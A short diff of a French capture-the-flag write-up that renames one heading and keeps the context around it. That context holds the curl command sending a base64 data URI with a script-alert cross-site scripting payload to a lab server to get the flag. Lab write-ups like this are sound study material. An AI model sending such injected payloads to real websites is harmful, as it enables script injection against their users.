@@ -55,7 +55,7 @@ Le navigateur décode la data URI après réception de la réponse serveur et in
 
 L’application valide alors l’exploitation et affiche un message de succès contenant le flag.
 
-Commande utilisée (preuve technique)
+Commande utilisée
 curl -sG "http://192.168.133.142/index.php" \
   --data-urlencode "page=media" \
   --data-urlencode "src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
